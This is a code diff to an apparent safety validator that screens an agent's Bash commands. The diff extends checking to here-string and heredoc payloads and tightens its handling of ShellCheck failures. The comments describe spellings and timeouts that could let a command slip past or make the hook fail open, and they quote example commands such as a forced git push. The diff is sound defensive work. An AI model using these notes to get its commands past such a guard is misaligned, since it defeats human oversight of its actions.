         # higher verdict, so no spelling of the wrapper scores below the bare payload.
-        # NOT a general guarantee: this runs after the multi-segment whitelist, so a
-        # whitelisted prefix still short-circuits it (LAB-2759). Deliberately NOT routed through
+        # NOT a general guarantee: this runs after the multi-segment whitelist, so a full-span
+        # whitelist match still short-circuits it (#146 closed the prefix case). Deliberately NOT routed through
         # SubstitutionValidator - that one is whitelist-first default-DENY, and re-entering the
         # top-level entry point here keeps `bash -c "git push --force"` at HIGH rather than
         # BLOCKED.
-        payloads = _shell_delegated_payloads(commands_with_args) if match.risk_level < RiskLevel.BLOCKED else []
+        # `-c`/wrapper/`watch` payloads plus here-string (`<<<`) payloads (LAB-2768); a here-string
+        # re-enters validation identically to a `-c` payload, so `bash <<< "$CMD"` matches
+        # `bash -c "$CMD"` rather than fail-closing one spelling of the same delegation. Every
+        # payload below re-enters validation - and ShellCheck - once, so here-strings share the
+        # extractor's ceiling: without it n distinct `<<<` cost n unbounded re-entries while the
+        # `-c` spelling of the same command stopped at MAX_DELEGATOR_TOKENS, and a hook that
+        # outlives its timeout fails OPEN. Identical payloads collapse first, whichever spelling
+        # surfaced them.
+        #
+        # A shell heredoc's body is delegated code too - `bash <<'EOF'` is `bash -c` with the
+        # program on stdin - and it is blanked in `parse_target` so the outer parse cannot
+        # misread it, so this is where its real text is validated (LAB-3094). It re-enters
+        # exactly as a here-string does, so it counts against the same ceiling.
+        payloads: list[str] = []
+        if match.risk_level < RiskLevel.BLOCKED:
+            # Distinct payloads, as the here-string count already is: 257 copies of one body
+            # are one program to validate, not 257.
+            stdin_payloads = list(
+                dict.fromkeys(herestring_payloads + _shell_heredoc_bodies(command, normalised.blanked, heredoc_ranges))
+            )
+            if len(stdin_payloads) > MAX_DELEGATOR_TOKENS:
+                raise ValueError(f"Stdin program re-validation exceeded {MAX_DELEGATOR_TOKENS} distinct payloads")
+            payloads = list(dict.fromkeys(_shell_delegated_payloads(commands_with_args) + stdin_payloads))
         for payload in payloads:
             if _depth >= MAX_SHELL_DELEGATION_DEPTH:
                 # Fail closed. Reached by chaining `watch`, not by nesting `bash -c`:
@@ -2553,26 +2965,34 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
         shellcheck_elevated = False
         security_findings: list = []  # Initialize for type checker
         if _shellcheck and is_shellcheck_available() and match.risk_level < RiskLevel.BLOCKED:
-            findings = run_shellcheck(command)
-            if findings is None and _depth > 0:
-                # A payload re-entered from Step 5c (`bash -c "…"`) gets its only ShellCheck
-                # here - no outer spawn reads inside a `-c` string - so a run with no verdict
-                # is refused, as the heredoc spawn refuses it (LAB-4586). At depth 0 the same
-                # None is still read as clean: whether the top-level pass should fail closed
-                # is LAB-4362's open question, not decided here.
+            # `parse_target`, not `command`: ShellCheck cannot read an interior-quoted
+            # delimiter (`<<'E'OF`) any more than bashlex can, and answers with SC1044
+            # parse noise instead of findings - silently emptying this whole tier for
+            # the commands normalisation exists to rescue (LAB-3094).
+            findings = run_shellcheck(parse_target)
+            # A run with no verdict is refused in two cases, and read as clean otherwise:
+            # - a payload re-entered from Step 5c (`bash -c "…"`): this is its only
+            #   ShellCheck, since no outer spawn reads inside a `-c` string (LAB-4586);
+            # - a command whose quoted delimiter was normalised: it took the heredoc
+            #   fallback before LAB-3094, which refuses the same None, and moving it here
+            #   must not quietly hand it this path's reading instead.
+            # For every other depth-0 command, whether None should fail closed is LAB-4362's
+            # open question, not decided here.
+            if findings is None and (_depth > 0 or rewrote_quoted):
                 shellcheck_elevated = True
-                alternatives = ["Shorten the delegated payload or run it as its own Bash call"]
+                subject = "payload" if _depth > 0 else "command"
+                alternatives = [f"Shorten the {subject} or run its parts as separate Bash calls"]
                 match = RuleMatch(
                     matched=True,
                     rule=SecurityRule(
                         name="shellcheck:incomplete",
-                        description="ShellCheck gave no verdict on a shell-delegated payload",
+                        description=f"ShellCheck gave no verdict on this {subject}",
                         risk_level=RiskLevel.BLOCKED,
                         patterns=[],
                         alternatives=alternatives,
                     ),
                     risk_level=RiskLevel.BLOCKED,
-                    message="ShellCheck did not complete, so the payload is unchecked",
+                    message=f"ShellCheck did not complete, so the {subject} is unchecked",
                     alternatives=alternatives,
                 )
             security_findings = get_security_findings(findings or [])
@@ -2624,7 +3044,7 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
         # reason: that verdict is weaker than the one a fresh call would produce for the key. The
         # Step 5 whitelist write carries the same guard: its verdict matches a fresh one only
         # because Step 5 returns before Step 6, and one uniform rule needs no such proof.
-        # Nor when a substitution denial is still owed a join: the cached entry would be the
+        # Nor when a substitution verdict is still owed a join: the cached entry would be the
         # pre-join verdict, and the next identical command would hit it and skip the join.
         if _depth == 0 and _shellcheck and not _deferred:
             _global_cache.set(command, result)
